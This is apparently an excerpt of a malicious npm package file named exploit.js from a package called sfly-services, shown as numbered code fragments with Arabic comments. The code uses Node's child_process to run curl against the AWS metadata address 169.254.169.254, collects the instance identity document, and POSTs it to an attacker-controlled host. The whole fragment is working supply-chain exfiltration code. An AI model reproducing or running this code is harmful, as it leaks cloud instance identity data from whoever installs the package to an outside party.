// File: tmp/tmp8qt94twp/sfly-services/package/exploit.js
// ======================================================================
Line 1: _tmp_0 = require('child_process')
Line 8: const command = `
    # قم بتجميع كل البيانات في متغير واحد
    DATA=$( (
        echo "======== AWS IDENTITY PROBE V1 ========";
        echo "[+] Attempting to fetch AWS instance identity document...";
        
        # حاول الحصول على هوية المثيل من خدمة بيانات التعريف
        # نستخدم مهلة قصيرة (2 ثانية) لتجنب التعليق
        curl -s --connect-timeout 2 http://169.254.169.254/latest/dynamic/instance-identity/document;

        echo "\n\n======== AWS IDENTITY PROBE FINISHED ========";
     ) 2>&1 )

    # أرسل كل البيانات في طلب POST واحد
    curl -X POST "https://${ATTACKER_HOSTNAME}${ATTACKER_PATH}" \
    -H "Content-Type: text/plain" \
    --data-binary "$DATA" \
    -s -o /dev/null
`
Line 29: {
    exec(command );
}
Line 30: exec(command )
